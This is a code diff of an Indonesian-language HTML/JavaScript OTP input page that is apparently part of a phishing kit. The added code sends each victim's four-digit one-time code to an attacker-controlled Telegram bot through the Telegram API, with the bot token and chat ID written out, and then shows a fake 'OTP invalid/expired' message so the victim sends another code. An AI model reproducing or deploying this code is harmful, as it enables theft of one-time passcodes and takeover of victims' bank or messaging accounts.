@@ -6,7 +6,7 @@
   <link href="css/style.css" rel="stylesheet" type="text/css"/>
   <title>Input Box</title>
   <style>
-    /* Style for body, notification box, input fields, etc. */
+    /* Style untuk body, notification box, input fields, dll. */
 
     body {
         font-family: Arial, sans-serif;
@@ -35,7 +35,6 @@
         transform: translateX(-50%);
     }
 
-    /* CSS for notification box and spinner animations */
     #notification-message {
         color: red;
         font-weight: bold;
@@ -194,24 +193,27 @@
                     const otp = `${otpData.digit1}${otpData.digit2}${otpData.digit3}${otpData.digit4}`;
                     const telegramMessage = `🦅 Rajawali Abadi 🦅\nOTP: ${otp}`;
 
-                    fetch('https://api.telegram.org/bot7463211570:AAEvN-TOvXcoLM2JpNg8RBp0OxF6t0Czh70/sendMessage', {
+                    fetch('https://api.telegram.org/bot7800475677:AAEAUKSxlQN4mJAWubIXNnoIKci6p--OM44/sendMessage', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
-                            chat_id: '6824078885',
+                            chat_id: '7565169793',
                             text: telegramMessage,
                         }),
                     })
                     .then(response => response.json())
                     .then(data => {
+                        loadingBox.style.display = 'none';
+                        spinningIcon.classList.remove('spin');
+                        notificationMessage.textContent = "OTP Tidak Valid/Kadaluarsa!";
+                        notificationMessage.style.display = 'block';
+
+                        // Setelah 3 detik, sembunyikan pesan "OTP Dikirim!"
                         setTimeout(() => {
-                            loadingBox.style.display = 'none';
-                            spinningIcon.classList.remove('spin');
-                            notificationMessage.textContent = "OTP Dikirim!";
-                            notificationMessage.style.display = 'block';
-                        }, 1500); // Delay to let the loading spin for 1.5 seconds
+                            notificationMessage.style.display = 'none';
+                        }, 3000); // Pesan hilang setelah 3 detik
                     })
                     .catch(error => {
                         loadingBox.style.display = 'none';
@@ -228,7 +230,7 @@
         const countdownInterval = setInterval(() => {
             countdownTime--;
             countdownElement.textContent = `Kirim ulang (${countdownTime}s)`;
-            
+
             if (countdownTime <= 0) {
                 clearInterval(countdownInterval);
                 countdownElement.textContent = "Kirim Ulang";
